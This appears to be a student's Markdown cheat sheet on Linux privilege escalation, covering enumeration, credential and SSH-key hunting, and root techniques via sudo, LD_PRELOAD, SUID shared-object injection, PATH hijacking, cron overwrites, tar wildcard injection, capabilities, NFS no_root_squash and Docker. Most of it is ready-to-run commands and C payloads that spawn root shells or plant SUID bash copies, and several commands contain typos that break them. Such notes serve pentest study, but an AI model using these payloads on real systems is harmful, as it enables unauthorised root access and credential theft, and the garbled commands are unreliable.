# Linux Privileage Escalation

# Table of Contents
1. [Initial Enumeration](#Enumeration)
2. [Automated Tools](#Automated)
3. [Kernel Exploits](#Kernel)

# 1. Initial Enumeration <a name="Enumeration"></a>
#### System Enumeration
`hostname`
`uname -a`
`cat /proc/version`
`cat /etc/issue`

`lscpu` to see architecture. Information about CPU.
`ps aux` to see what process are running.
* * *

#### User Enumeration
`whoami`
`id`
`sudo -l`
`cat etc\passwd | cut -d : -f 1`
`cat etc\shadow`
`cat etc\group`
`history`
`sudo .. ` escalate by typing some password.
* * *

#### Network Enumeration
`ifconfig`
`ip address`
`route`
`ip route`
`arp -a`
`ip neighbour`
`netstat`

#### Password Hunting
`grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2> /dev/null` or can use PASS....
`locate password | more` or `locate pass | more`
`find / -name id_rsa 2> /dev/null`

# 2. Automated Tools <a name="Automated"></a>

- LinPEAS - Linux Privilege Escalation Awesome Script: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
- LinEnum: https://github.com/rebootuser/LinEnum
- LES: Linux privilege escalation auditing tool: https://github.com/mzet-/linux-exploit-suggester
-  Python Linux Privilege Escalation Check Script: https://github.com/sleventyeleven/linuxprivchecker

# 3. Kernel Exploits <a name="Kernel"></a>

Kernel Exploits: https://github.com/lucyoa/kernel-exploits
<break>
Type `uname -a` and copy paste the result in google and check for vulnerability or can find by searchsploit.

Check keranal exploit and download the exploit. Run the exploit by the what is mentioned readme.

# 4. Passwords & File permissions <a name="Passwords & File Permissions"></a>

#### Escalation via stored Passwords

`history` or `cat .bash_history` to check for sensitivity items. Check whther they work like password.

`find -type f -exec grep -i -I "PASSWORD" {} /dev/null \;` to search word password in the current folder.

We can use also automated tools for doing the above like linpeas.

Check what is just infront of us.  
If there is apache server or anything check whether any credentials are stored in web server.

* * *

#### Escalation via Weak File Permissions

Check whether we have any access to file or folder that we are not supposed to have for example passwd file or shadow file.

If we have write permission we can modify passwd or shadow file to login as rooot user.

We can use john or hashcat for seeing password. We can search for hashcat type for seeeing which hashes it using.

* * *

#### Escalation via SSH keys

[payloadallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

Look for we can acces authorized\_keys and id\_rsa:  
`find / -name authorized_keys 2> /dev/null`  
`find / -name id_rsa 2> /dev/null`

For example if we find id_rsa we can copy paste and try login using that: `ssh -i id_rsa root@<target_ip>`.


# 5. Sudo <a name="Sudo"></a>

Allow us to run command as root.

#### Sudo shell Escaping

`sudo -l`
`cat /etc/sudoers`
`sudo -V`
[GTFOBins](https://gtfobins.github.io/)

[Linux PrivEsc playground - tryhackme](https://tryhackme.com/room/privescplayground)

* * *

#### Escalation via Intended Functionality

For example apache and we may not have this GTFOBins but we have sudo. So we search in google for apache "sudo privelege escalation". Then we may get some results. For example `sudo apache2 -f /etc/shadow`.

[wget](https://veteransec.com/2018/09/29/hack-the-box-sunday-walkthrough/)

* * *

#### Escalation via LD_PRELOAD

```C
#include<stdio.h>
#include<sys/type.h>
#include<stdlib.h>

void init()
{
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

`gcc -fPIC -share -o shell.so shell.c -nostartfile`
`sudo LD_PRELOAD=file/path/shell.so apche2`.


#### Examples of exploits

[CMS Made Simple](https://www.exploit-db.com/exploits/46635)
[CVE-2019-14287 Security Bypass](https://www.exploit-db.com/exploits/47502)
[CVE-2019-18634 Github](https://github.com/saleemrashid/sudo-cve-2019-18634)


# 6. SUID <a name="SUID"></a>

`find / -perm -u=s -type f 2>dev/null`  
Also we can use winpeas.

Then search find file gtfo website.

* * *

## Other SUID escalation

`find / -type f -perm 04000 -ls 2>/dev/null`

#### Esclation via shared object injection

Check for the file which have shared asccess.  
to check access. `ls -la <filename>`  
Try running it. To get more info: `starce <filename> 2&>1`

`starce <filename> 2&>1 | grep -i -E "open|acess|no such file"`

Check for path and try inject malicious code instead. So when executing the file name again. It should execute the malicious code:

```C
#include<stdio.h>
#include<stdlib.h>

static void inject() __attribute__((constructor));

void inject()
{
 system("cp /bin/bash/ /tmp/bash && chmod +s  /tmp/bash && /tmp/bash -p");
 }
```

`gcc -shared -fPIC -o <filepath/filename> <file.c>`

Then we can get root access.

* * *

#### Escalation via binary symlinks(symbolic link)

[Nginx-Exploit](https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html)

When web server is compromised we login as www-data user.

- Run Lunux-Exploit-Suggester

- Then try to find nginxed-root.sh exploit.

- `dpkg -l | grep nginx`

- `find / -type f -perm 04000 -ls 2>/dev/null` and check if /usr/bin/sudo  have -rws------. This is required fot exploit to work.

- To see log file `ls -la /var/log/nginx` Then we need to replace the log file with malicious code for sylink.

- Run nginx `./nginxed-root.sh /var/log/nginx/eror.log` and press enter.

- Then make a new connection by ssh again in a new terminal as root. Run command `invoke-rc.d nginx rotate >/dev/null 2>&1`. This will simulate restart of nginx.
- Then we will have root access in the previous terminal.

* * *

#### Escalation via Environment Variables

- `env`
- `find / -type f -perm 04000 -ls 2>/dev/null` to find the environment variables.
- Run a env file.
- And check what it is doing by `strings /pathname/file`
- For example 'service'
- `print $PATH` to see the PATH.
- If we add a malicious file and add that to file to path could execute the malicious file.
- `echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/service.c
`
`gcc /tmp/service.c -o /tmp/service` now /tmp/service is the malicious file.
- Now we add malicous file to the path. For that `export PATH=/tmp:$PATH`
- Check PATH by `print $PATH`
- Now try executing the previous file.

If we are having direct path like '/usr/sbin/service' we can exploit this by

- Create a malicous function.
- `function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }`
- Export this function by `export -f /usr/sbin/service` -f is shel function.
- This will escalate our privileages to root. 


# 7. Capabilities <a name="Capabilities"></a>

#### Capabilities overview

[Linux Privileage Escalation using capabilities](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/)
[SUID vs Capabilities](https://mn3m.info/posts/suid-vs-capabilities/)
[Linux Capabilities Privilege Escalation via OpenSSL with SELinux Enabled and Enforced](https://medium.com/@int0x33/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099)

Hunting capabilities - `gcap -r / 2>/dev/null`

* * *

#### Escalation via Capabilities

Example:
`getcap -r / 2>/dev/null` gives the output as follows:
/usr/bin/python2.6 = cap_setuid+ep

`/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'` - this will make us root.

Some common capabilities to look for:
- tar
- openssl
- perl

# 8. Scheduled Task <a name="Sheduled Task"></a>

#### Crons job & Systemd Timers overview

`cat /etc/crontab`

Check for task running every minute or 5 minutes etc.  
"*" across all means task is running every minutes.  
[PayLoadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

`systemctl list-timers --all`

* * *

#### Escalaion via cron paths

First see PATH and check which location is it checks first.  
Check if the task is present in the first location if not create a task in the same name which is having malicious code.

`echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh` if [overwrite.sh](http://overwrite.sh) is a task.

Make [overwrite.sh](http://overwrite.sh) executable using `chmod +x overwrite.sh`

Wait for the code to execute.

then we can execute `/tmp/bash -p` this will excalate to root user.

* * *

#### Cron Wildcards

Check what the task is doing by using cat.

Check whether its using wild card *. Then we can do injection here.

For example:  
/usr/local/bin/compress.sh is task.

`cat /usr/local/bin/compress.sh` to check what its doing, suppose:

```sh
#!/bin/sh

cd /home/user
tar czf  /tmp/backup.tar.gz *
```

In the above example its making some backup and its using wildcard.
`echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > runme.sh`

Make runme.sh executable by `chmod +x runme.sh`

Then we can use some tar specified cammands,
`touch /home/user/--checkpoint=1`
`touch /home/user/--checkpoint-action=exec=sh\ runme.sh`

The above commands will display progress message for every 1 number. When hit this checkpoint do some action. This is because there is wildcard. So above commands will be like: 
`tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh\runme.sh`

So running `/tmp/bash -p` will give as root.

***

#### Cron File Overwrites

Just like cron path but instead of putting file in first path we can overwirte existing file for local privileage escalation or reverse shell.

`echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /usr/local/bin/overwrite.sh`.

Then run `/tmp/bash` after one minute get to root.

# 9. NFS Root Squashing <a name="NFS Root Squashing"></a>

`cat /etc/exports` then check for no root squash. That means that directory shareable and can be mounted.

In attacker machine `showmount -e <target_ip>` to see mountable folder.

`mkdir /tmp/mountme`
`mount -o  rw,vers=2 <target_ip>:mountable_folder /tmp/mountme`

Then we can mount malicous code to it. For example:
`echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/mountme/x.c`

Now we can compile by,`gcc /tmp/mountme/x.c -o /tmp/mountme/x`

Then `chmod +s /tmp/mountme/x`

Then execute the x from target shell. `cd /sharefolder/` and `./x`. This will give root access.

# 10. Escalation via Docker <a name="Escalation via Docker"></a>

First get into a low privilaged user.

Export LinEnum and exeute this tmp.

Check the result to find docker.

search docker gtfobins. 

We are in shell we can run `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` but our shell is bash so we need to change the above command to `docker run -v /:/mnt --rm -it bash chroot /mnt sh`

Then we will be in root.